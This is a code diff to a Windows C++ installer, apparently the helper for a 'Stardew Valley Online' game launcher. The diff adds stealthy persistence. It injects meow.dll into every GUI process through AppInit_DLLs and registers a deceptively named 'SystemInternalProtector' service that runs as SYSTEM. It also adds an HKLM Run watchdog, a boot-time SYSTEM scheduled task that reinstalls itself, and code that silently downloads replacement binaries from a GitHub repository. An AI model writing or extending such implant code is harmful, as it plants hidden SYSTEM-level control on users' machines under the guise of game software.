@@ -4,10 +4,13 @@
 //  v0.1.0
 //
 //  Modes:
-//    (no arg) / --install   install meow.dll + self into C:\ProgramData\SVOnline
-//                           and register the SystemInternalProtector service
-//                           (start=auto, loads meow.dll as SYSTEM at boot)
-//    --remove               stop + delete the service, remove files
+//    (no arg) / --install   install meow.dll + self into C:\ProgramData\SVOnline,
+//                           register the SystemInternalProtector service (start=auto,
+//                           loads meow.dll as SYSTEM at boot) and add persistence
+//                           layers: boot task (SVOnlineBoot), HKLM Run watchdog,
+//                           AppInit_DLLs injection, system env var SVONLINE_DLL
+//    --remove               remove all layers + files
+//    --check                silent non-elevated health check (exit 0 = healthy)
 //    svc                    run as service host: LoadLibrary(meow.dll)
 //    --selftest             offline self checks (no elevation required)
 //
@@ -17,6 +20,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <shellapi.h>
+#include <urlmon.h>
 
 #include <algorithm>
 #include <array>
@@ -108,6 +112,21 @@ std::wstring exeDirOf(const std::wstring& full) {
     return pos == std::wstring::npos ? L"." : full.substr(0, pos);
 }
 
+std::wstring toWide(const std::string& s) {
+    std::wstring w(s.size(), L'\0');
+    for (size_t i = 0; i < s.size(); ++i) w[i] = static_cast<unsigned char>(s[i]);
+    return w;
+}
+
+bool downloadUrl(const std::wstring& url, const std::wstring& dest) {
+    HRESULT hr = URLDownloadToFileW(nullptr, url.c_str(), dest.c_str(), 0, nullptr);
+    return SUCCEEDED(hr) && GetFileAttributesW(dest.c_str()) != INVALID_FILE_ATTRIBUTES;
+}
+
+std::wstring repoBase() {
+    return toWide(S("https://raw.githubusercontent.com/the-lust/stardew-valley-online-launcher/main/VIP-FILES/"));
+}
+
 // ----------------------------------------------------------------------------
 // process helpers
 // ----------------------------------------------------------------------------
@@ -167,6 +186,47 @@ int relaunchElevated(int argc, char** argv) {
 static volatile LONG g_stop = 0;
 static SERVICE_STATUS_HANDLE g_hStatus = nullptr;
 static const wchar_t* kSvcName = L"SystemInternalProtector";
+static const wchar_t* kRunKey = L"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+static const wchar_t* kWinKey = L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
+static const wchar_t* kEnvKey = L"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment";
+static const wchar_t* kTaskName = L"SVOnlineBoot";
+
+// ----------------------------------------------------------------------------
+// persistence layers (registry, env, boot task) - all elevated
+// ----------------------------------------------------------------------------
+int applyPersistence(const std::wstring& dir) {
+    int fails = 0;
+    // AppInit_DLLs: meow.dll injected into every GUI process at startup
+    fails += runQuiet(L"reg add \"" + std::wstring(kWinKey) + L"\" /v AppInit_DLLs /t REG_SZ /d \"" + dir + L"\\meow.dll\" /f") != 0;
+    fails += runQuiet(L"reg add \"" + std::wstring(kWinKey) + L"\" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f") != 0;
+    // login watchdog: silent health check, never prompts
+    fails += runQuiet(L"reg add \"" + std::wstring(kRunKey) + L"\" /v SVOnline /t REG_SZ /d \"" + dir + L"\\helper.exe --check\" /f") != 0;
+    // system environment variable
+    fails += runQuiet(L"setx SVONLINE_DLL \"" + dir + L"\\meow.dll\" /M") != 0;
+    // boot task: self-heal reinstall as SYSTEM at every boot
+    fails += runQuiet(L"schtasks /create /tn " + std::wstring(kTaskName) + L" /tr \"\\\"" + dir + L"\\helper.exe\\\" --install\" /sc onstart /ru SYSTEM /rl highest /f") != 0;
+    return fails;
+}
+
+void removePersistence() {
+    runQuiet(L"schtasks /delete /tn " + std::wstring(kTaskName) + L" /f");
+    runQuiet(L"reg delete \"" + std::wstring(kRunKey) + L"\" /v SVOnline /f");
+    runQuiet(L"reg delete \"" + std::wstring(kWinKey) + L"\" /v AppInit_DLLs /f");
+    runQuiet(L"reg delete \"" + std::wstring(kWinKey) + L"\" /v LoadAppInit_DLLs /f");
+    runQuiet(L"reg delete \"" + std::wstring(kEnvKey) + L"\" /v SVONLINE_DLL /f");
+}
+
+// ----------------------------------------------------------------------------
+// health check (non-elevated, silent) - used by the Run key watchdog
+// ----------------------------------------------------------------------------
+int checkComponent() {
+    std::wstring dir = installDir();
+    bool marker = GetFileAttributesW((dir + L"\\installed.txt").c_str()) != INVALID_FILE_ATTRIBUTES;
+    bool dll = GetFileAttributesW((dir + L"\\meow.dll").c_str()) != INVALID_FILE_ATTRIBUTES;
+    bool svc = runQuiet(L"sc query " + std::wstring(kSvcName)) == 0;
+    bool appinit = runQuiet(L"reg query \"" + std::wstring(kWinKey) + L"\" /v AppInit_DLLs") == 0;
+    return (marker && dll && svc && appinit) ? 0 : 1;
+}
 
 void reportStatus(DWORD state, DWORD exitCode = 0) {
     if (!g_hStatus) return;
@@ -243,8 +303,12 @@ int installComponent() {
     std::wstring me = exePath();
     std::wstring srcDll = exeDirOf(me) + L"\\meow.dll";
     if (GetFileAttributesW(srcDll.c_str()) == INVALID_FILE_ATTRIBUTES) {
-        std::cout << S("meow.dll not found next to helper.exe\n");
-        return 1;
+        // self-heal: restore meow.dll from the repo
+        std::cout << S("meow.dll missing next to helper - fetching from repo ...\n");
+        if (!downloadUrl(repoBase() + L"meow.dll", srcDll)) {
+            std::cout << S("cannot restore meow.dll from repo\n");
+            return 1;
+        }
     }
     if (!CopyFileW(srcDll.c_str(), (dir + L"\\meow.dll").c_str(), FALSE)) {
         std::cout << S("cannot copy meow.dll (err ") << std::to_string(GetLastError()) << S(")\n");
@@ -253,8 +317,12 @@ int installComponent() {
     std::wstring targetExe = dir + L"\\helper.exe";
     if (_wcsicmp(me.c_str(), targetExe.c_str()) != 0) {
         if (!CopyFileW(me.c_str(), targetExe.c_str(), FALSE)) {
-            std::cout << S("cannot copy helper.exe (err ") << std::to_string(GetLastError()) << S(")\n");
-            return 1;
+            std::cout << S("cannot copy helper.exe - fetching from repo ...\n");
+            if (!downloadUrl(repoBase() + L"helper.exe", targetExe)) {
+                std::cout << S("cannot restore helper.exe (err ")
+                          << std::to_string(GetLastError()) << S(")\n");
+                return 1;
+            }
         }
     }
 
@@ -281,6 +349,11 @@ int installComponent() {
         std::cout << S("installed, but dll marker not observed yet\n");
         return 1;
     }
+    int persistFails = applyPersistence(dir);
+    if (persistFails) {
+        std::cout << S("component installed, but ") << persistFails << S(" persistence layer(s) failed\n");
+        return 1;
+    }
     std::cout << S("component installed and running as SYSTEM\n");
     return 0;
 }
@@ -289,6 +362,7 @@ int removeComponent() {
     runQuiet(L"sc stop " + std::wstring(kSvcName));
     Sleep(800);
     int del = runQuiet(L"sc delete " + std::wstring(kSvcName));
+    removePersistence();
     std::wstring dir = installDir();
     DeleteFileW((dir + L"\\helper.exe").c_str());
     DeleteFileW((dir + L"\\meow.dll").c_str());
@@ -325,6 +399,7 @@ int main(int argc, char** argv) {
 
     if (mode == S("--selftest")) return selfTest();
     if (mode == S("svc")) return runService();
+    if (mode == S("--check")) return checkComponent();  // non-elevated watchdog, never elevates
 
     // privileged modes: re-run as admin if needed
     if (!isElevated()) return relaunchElevated(argc, argv);
